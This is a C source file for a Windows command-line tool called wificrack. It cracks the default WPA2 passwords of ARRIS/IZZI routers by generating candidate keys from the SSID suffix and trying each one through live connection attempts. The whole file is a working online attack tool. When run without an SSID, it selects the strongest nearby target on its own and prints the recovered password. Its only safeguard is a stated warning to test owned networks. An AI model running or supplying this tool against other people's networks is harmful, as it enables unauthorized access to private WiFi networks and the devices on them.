/*
 * wificrack — Prove ARRIS default WiFi passwords are crackable
 * Part of the Lantern network toolkit
 *
 * Full attack chain:
 *   1. Scan WiFi → find ARRIS/IZZI networks with default SSIDs
 *   2. Generate password candidates from SSID suffix (keygen logic)
 *   3. Test each candidate by attempting a WPA2 connection
 *   4. Report the working password + time elapsed
 *
 * This is an ONLINE attack: it tests passwords by actually connecting
 * to the target network via the Windows WLAN API.  Each wrong password
 * fails in ~1-2s (4-way handshake rejection).  With only 256 candidates
 * per OUI, the correct password is found in minutes, not hours.
 *
 * WARNING: Only use on networks you own or have written permission to test.
 *
 * Usage:
 *   wificrack IZZI-1F56          (crack specific network)
 *   wificrack                    (scan, list targets, pick one)
 *
 * Compile:
 *   gcc -O2 -Wall -Wextra -o wificrack.exe wificrack.c -lws2_32 -liphlpapi -lwlanapi -lole32
 */

#include "lantern.h"
#include <wlanapi.h>
#include "lantern.h"  /* re-include to activate WLAN extension */

/* ── Connection state (set by notification callback) ──────────────── */

static volatile LONG g_state = 0;  /* 0=waiting, 1=connected, 2=failed */
static char g_notify_ssid[33];     /* SSID from connection_complete notification */

static void WINAPI wlan_notify(PWLAN_NOTIFICATION_DATA data, PVOID ctx) {
    (void)ctx;
    if (data->NotificationSource != WLAN_NOTIFICATION_SOURCE_ACM) return;

    switch (data->NotificationCode) {
        case 10: { /* connection_complete */
            /* connection_complete fires for BOTH success and failure —
               must check wlanReasonCode to distinguish */
            if (data->pData && data->dwDataSize >=
                    sizeof(WLAN_CONNECTION_NOTIFICATION_DATA)) {
                WLAN_CONNECTION_NOTIFICATION_DATA *nd =
                    (WLAN_CONNECTION_NOTIFICATION_DATA *)data->pData;
                if (nd->wlanReasonCode == 0) {
                    /* Capture connected SSID for verification */
                    ULONG sl = nd->dot11Ssid.uSSIDLength;
                    if (sl > 32) sl = 32;
                    memset(g_notify_ssid, 0, sizeof(g_notify_ssid));
                    memcpy(g_notify_ssid, nd->dot11Ssid.ucSSID, sl);
                    InterlockedExchange(&g_state, 1);
                } else {
                    InterlockedExchange(&g_state, 2);
                }
            } else {
                InterlockedExchange(&g_state, 2);
            }
            break;
        }
        case 11: /* connection_attempt_fail */
        case 21: /* disconnected */
            InterlockedExchange(&g_state, 2);
            break;
    }
}

/* ── Build WPA2-PSK profile XML ───────────────────────────────────── */

static int build_profile(wchar_t *wxml, size_t wlen,
                          const char *ssid, const char *password) {
    /* Reject SSIDs with XML-unsafe characters */
    for (const char *p = ssid; *p; p++) {
        if (*p == '<' || *p == '>' || *p == '&' || *p == '"' || *p == '\'')
            return 0;
    }

    char xml[2048];
    snprintf(xml, sizeof(xml),
        "<?xml version=\"1.0\"?>"
        "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">"
        "<name>lantern_crack</name>"
        "<SSIDConfig><SSID><name>%s</name></SSID></SSIDConfig>"
        "<connectionType>ESS</connectionType>"
        "<connectionMode>manual</connectionMode>"
        "<MSM><security>"
        "<authEncryption>"
        "<authentication>WPA2PSK</authentication>"
        "<encryption>AES</encryption>"
        "<useOneX>false</useOneX>"
        "</authEncryption>"
        "<sharedKey>"
        "<keyType>passPhrase</keyType>"
        "<protected>false</protected>"
        "<keyMaterial>%s</keyMaterial>"
        "</sharedKey>"
        "</security></MSM>"
        "</WLANProfile>", ssid, password);

    MultiByteToWideChar(CP_UTF8, 0, xml, -1, wxml, (int)wlen);
    return 1;
}

/* ── Try one password ─────────────────────────────────────────────── */

/* Returns: 1 = password works, 0 = wrong password, -1 = error */
static int try_password(HANDLE wlan, GUID *guid,
                        const char *ssid, const char *password) {
    wchar_t wxml[2048];
    if (!build_profile(wxml, 2048, ssid, password))
        return -1;

    /* Set temporary profile */
    DWORD reason = 0;
    DWORD ret = WlanSetProfile(wlan, guid, 0, wxml, NULL, TRUE, NULL, &reason);
    if (ret != ERROR_SUCCESS) return -1;

    /* Attempt connection */
    WLAN_CONNECTION_PARAMETERS params;
    memset(&params, 0, sizeof(params));
    params.wlanConnectionMode = wlan_connection_mode_profile;
    params.strProfile = L"lantern_crack";
    params.dot11BssType = dot11_BSS_type_infrastructure;

    InterlockedExchange(&g_state, 0);

    ret = WlanConnect(wlan, guid, &params, NULL);
    if (ret != ERROR_SUCCESS) {
        WlanDeleteProfile(wlan, guid, L"lantern_crack", NULL);
        return -1;
    }

    /* Wait for notification: connected (1) or failed (2)
       Timeout after 5 seconds — wrong password or unreachable */
    for (int tick = 0; tick < 50; tick++) {
        LONG s = InterlockedCompareExchange(&g_state, 0, 0);
        if (s == 1) {
            /* Check 1: SSID from notification matches target */
            if (_stricmp(g_notify_ssid, ssid) != 0) {
                WlanDeleteProfile(wlan, guid, L"lantern_crack", NULL);
                return 0;
            }

            /* Check 2: Hold 500ms — false associations drop almost immediately
               after the 4-way handshake fails */
            Sleep(500);
            LONG s2 = InterlockedCompareExchange(&g_state, 0, 0);
            if (s2 != 1) {
                WlanDeleteProfile(wlan, guid, L"lantern_crack", NULL);
                return 0;
            }

            /* Still connected after 2s — password is confirmed */
            WlanDisconnect(wlan, guid, NULL);
            WlanDeleteProfile(wlan, guid, L"lantern_crack", NULL);
            return 1;
        }
        if (s == 2) {
            WlanDeleteProfile(wlan, guid, L"lantern_crack", NULL);
            return 0;
        }
        Sleep(100);
    }

    /* Timeout — treat as failure */
    WlanDisconnect(wlan, guid, NULL);
    WlanDeleteProfile(wlan, guid, L"lantern_crack", NULL);
    return 0;
}

/* ── Reconnect to saved network ───────────────────────────────────── */

static void reconnect(HANDLE wlan, GUID *guid, const wchar_t *profile) {
    if (!profile[0]) return;

    WLAN_CONNECTION_PARAMETERS params;
    memset(&params, 0, sizeof(params));
    params.wlanConnectionMode = wlan_connection_mode_profile;
    params.strProfile = profile;
    params.dot11BssType = dot11_BSS_type_infrastructure;

    InterlockedExchange(&g_state, 0);
    WlanConnect(wlan, guid, &params, NULL);

    for (int tick = 0; tick < 100; tick++) {
        if (InterlockedCompareExchange(&g_state, 0, 0) == 1) break;
        Sleep(100);
    }
}

/* ── Main ─────────────────────────────────────────────────────────── */

int main(int argc, char **argv) {
    if (lantern_check_flags(argc, argv, "wificrack",
            "prove ARRIS default passwords are crackable",
            "Usage: wificrack [options] [SSID]\n"
            "\n"
            "Options:\n"
            "  --dry-run    List candidates without connecting\n"
            "  -h, --help   Show this help\n"
            "  -v, --version  Show version\n"
            "\n"
            "WARNING: Only use on networks you own or have written permission to test."))
        return 0;

    /* Check for --dry-run */
    int dry_run = 0;
    const char *ssid_arg = NULL;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--dry-run") == 0) dry_run = 1;
        else if (argv[i][0] != '-') ssid_arg = argv[i];
    }

    lantern_init();

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        fprintf(stderr, "WSAStartup failed\n");
        return 1;
    }

    lantern_banner("wificrack",
                   "prove ARRIS default passwords are crackable");

    /* Open WLAN handle */
    DWORD negotiated;
    HANDLE wlan = NULL;
    if (WlanOpenHandle(2, NULL, &negotiated, &wlan) != ERROR_SUCCESS) {
        printf("  " C_RED "[!]" C_RESET " Cannot open WiFi adapter\n");
        WSACleanup();
        return 1;
    }

    PWLAN_INTERFACE_INFO_LIST il = NULL;
    WlanEnumInterfaces(wlan, NULL, &il);
    if (!il || il->dwNumberOfItems == 0) {
        printf("  " C_RED "[!]" C_RESET " No WiFi adapter found\n");
        if (il) WlanFreeMemory(il);
        WlanCloseHandle(wlan, NULL);
        WSACleanup();
        return 1;
    }

    /* Copy GUID value before freeing interface list (avoid dangling pointer) */
    GUID guid = il->InterfaceInfo[0].InterfaceGuid;
    WlanFreeMemory(il);

    /* Register for connection notifications */
    DWORD prev_source = 0;
    WlanRegisterNotification(wlan, WLAN_NOTIFICATION_SOURCE_ACM, TRUE,
                             (WLAN_NOTIFICATION_CALLBACK)wlan_notify,
                             NULL, NULL, &prev_source);

    /* Save current connection so we can restore it */
    wchar_t saved_profile[256] = {0};
    {
        PWLAN_CONNECTION_ATTRIBUTES conn = NULL;
        DWORD sz = 0;
        WLAN_OPCODE_VALUE_TYPE opcode_type;
        if (WlanQueryInterface(wlan, &guid,
                               wlan_intf_opcode_current_connection,
                               NULL, &sz, (PVOID *)&conn,
                               &opcode_type) == ERROR_SUCCESS && conn) {
            wcsncpy(saved_profile, conn->strProfileName, 255);
            WlanFreeMemory(conn);
        }
    }

    /* Find or select target */
    char target_ssid[33] = {0};
    uint8_t suffix[2];

    if (ssid_arg) {
        snprintf(target_ssid, sizeof(target_ssid), "%s", ssid_arg);
        if (!lantern_parse_arris_suffix(target_ssid, suffix)) {
            printf("  " C_RED "[!]" C_RESET
                   " Cannot parse SSID '%s'\n", ssid_arg);
            printf(C_DIM "  Expected: IZZI-XXXX or ARRIS-XXXX\n" C_RESET);
            goto cleanup;
        }
    } else {
        LanternArrisTarget targets[16];
        int count = lantern_scan_arris_targets(targets, 16, wlan, &guid);
        if (count == 0) {
            printf("  " C_DIM "No ARRIS/IZZI networks in range.\n" C_RESET);
            goto cleanup;
        }

        printf("  Found " C_BOLD "%d" C_RESET " target%s:\n\n",
               count, count > 1 ? "s" : "");
        for (int i = 0; i < count; i++) {
            printf("  " C_YELLOW "[%d]" C_RESET " %-20s  %s  %ld dBm\n",
                   i + 1, targets[i].ssid,
                   targets[i].bssid, targets[i].rssi);
        }

        /* Auto-select strongest signal */
        int pick = 0;
        for (int i = 1; i < count; i++)
            if (targets[i].rssi > targets[pick].rssi) pick = i;

        snprintf(target_ssid, sizeof(target_ssid), "%s", targets[pick].ssid);
        suffix[0] = targets[pick].suffix[0];
        suffix[1] = targets[pick].suffix[1];
    }

    /* ── Attack ───────────────────────────────────────────────────── */

    int total = (int)LANTERN_ARRIS_OUI_COUNT * 256;

    if (dry_run) {
        lantern_section("DRY RUN");
        printf("  Target:     " C_CYAN C_BOLD "%s" C_RESET "\n", target_ssid);
        printf("  Suffix:     " C_CYAN "%02X%02X" C_RESET "\n",
               suffix[0], suffix[1]);
        printf("  Candidates: " C_BOLD "%d" C_RESET "\n\n", total);

        for (int o = 0; o < (int)LANTERN_ARRIS_OUI_COUNT; o++) {
            const uint8_t *oui = LANTERN_ARRIS_OUIS[o];
            for (int b = 0; b < 256; b++) {
                char password[16];
                lantern_arris_password(oui, b, suffix, password,
                                       sizeof(password));
                printf("  %s\n", password);
            }
        }
        printf("\n  " C_BOLD "%d" C_RESET " candidates listed (no connections made).\n",
               total);
        goto cleanup;
    }

    lantern_section("ATTACK");
    printf("  Target:     " C_CYAN C_BOLD "%s" C_RESET "\n", target_ssid);
    printf("  Suffix:     " C_CYAN "%02X%02X" C_RESET " (from SSID)\n",
           suffix[0], suffix[1]);
    printf("  Candidates: " C_BOLD "%d" C_RESET
           " (%d OUIs x 256)\n", total, (int)LANTERN_ARRIS_OUI_COUNT);
    printf("  Method:     WPA2 connection attempt (online)\n\n");

    printf("  " C_YELLOW "WARNING" C_RESET
           "  WiFi will disconnect during testing.\n");
    printf("           "
           "Will reconnect automatically when done.\n\n");

    Sleep(2000);

    LARGE_INTEGER freq, start, now;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    int attempt = 0;
    int found = 0;
    char cracked_password[16] = {0};

    for (int o = 0; o < (int)LANTERN_ARRIS_OUI_COUNT && !found; o++) {
        const uint8_t *oui = LANTERN_ARRIS_OUIS[o];
        printf("  Testing OUI " C_CYAN "%02X:%02X:%02X" C_RESET " ...\n",
               oui[0], oui[1], oui[2]);

        for (int b = 0; b < 256 && !found; b++) {
            attempt++;
            char password[16];
            lantern_arris_password(oui, b, suffix, password, sizeof(password));

            printf("\r  [%4d/%d] %s  ", attempt, total, password);
            fflush(stdout);

            int result = try_password(wlan, &guid, target_ssid, password);

            if (result == 1) {
                found = 1;
                snprintf(cracked_password, sizeof(cracked_password),
                         "%s", password);
                printf(C_GREEN C_BOLD "FOUND!" C_RESET "\n");
            } else if (result == -1) {
                printf(C_RED "error" C_RESET "\n");
            }
        }

        if (!found)
            printf("\r  [%4d/%d] OUI %02X:%02X:%02X exhausted        \n",
                   attempt, total, oui[0], oui[1], oui[2]);
    }

    QueryPerformanceCounter(&now);
    double elapsed = (double)(now.QuadPart - start.QuadPart) /
                     (double)freq.QuadPart;

    /* ── Result ───────────────────────────────────────────────────── */

    printf("\n");
    if (found) {
        int minutes = (int)elapsed / 60;
        int seconds = (int)elapsed % 60;

        printf("  " C_GREEN
               "══════════════════════════════════════════\n" C_RESET);
        printf("  " C_GREEN C_BOLD
               "  PASSWORD: %s" C_RESET "\n", cracked_password);
        printf("  " C_GREEN
               "══════════════════════════════════════════\n" C_RESET);
        printf("\n");
        printf("  Network:  %s\n", target_ssid);
        printf("  Attempts: %d of %d\n", attempt, total);
        printf("  Time:     %dm %ds\n", minutes, seconds);
        printf("  Speed:    %.1f passwords/sec\n",
               (double)attempt / elapsed);
    } else {
        printf("  " C_YELLOW "No default password found." C_RESET "\n");
        printf("  Network may use a custom password (good).\n");
    }

    /* ── Reconnect ────────────────────────────────────────────────── */

    if (saved_profile[0]) {
        printf("\n" C_DIM "  Reconnecting to original network..." C_RESET);
        fflush(stdout);
        reconnect(wlan, &guid, saved_profile);
        printf("\r  Reconnected to original network.        \n");
    }

cleanup:
    printf("\n");
    WlanCloseHandle(wlan, NULL);
    WSACleanup();
    return 0;
}
